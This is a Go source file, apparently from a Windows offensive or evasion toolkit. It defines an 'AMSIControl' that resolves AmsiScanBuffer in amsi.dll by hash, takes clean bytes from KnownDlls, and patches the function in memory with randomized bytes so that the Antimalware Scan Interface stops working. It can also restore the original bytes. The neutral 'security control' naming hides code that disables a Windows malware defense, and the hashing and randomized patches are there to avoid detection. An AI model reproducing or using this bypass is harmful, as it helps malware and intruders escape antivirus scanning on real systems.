//go:build windows && amd64

package securityctl

import "fmt"

type AMSIControl struct {
	baseControl
	fp *funcPatch
}

func NewAMSIControl() *AMSIControl {
	return &AMSIControl{baseControl: newBaseControl("amsi")}
}

func (a *AMSIControl) Initialize() error {
	fp, err := resolveFuncByHash("amsi.dll", "AmsiScanBuffer")
	if err != nil {
		return a.markInitialized(fmt.Errorf("securityctl: amsi: resolve: %w", err))
	}

	knownDllFP, kerr := resolveFuncFromKnownDlls("amsi.dll", "AmsiScanBuffer")
	if kerr == nil && knownDllFP != nil {
		fp.orig = knownDllFP.orig
	}

	a.fp = fp
	return a.markInitialized(nil)
}

func (a *AMSIControl) Enable() error {
	if err := a.markEnabled(); err != nil {
		return err
	}
	if a.fp == nil {
		a.markDisabled()
		return fmt.Errorf("securityctl: amsi: not initialized")
	}
	a.fp.patch = randomAmsiPatchBytes()
	if err := applyPatch(a.fp); err != nil {
		a.markDisabled()
		return err
	}
	return nil
}

func (a *AMSIControl) Disable() error {
	if a.fp == nil {
		a.markDisabled()
		return nil
	}
	if err := restorePatch(a.fp); err != nil {
		return err
	}
	a.markDisabled()
	return nil
}

func (a *AMSIControl) Restore() {
	if a.fp == nil {
		return
	}
	_ = restorePatch(a.fp)
}
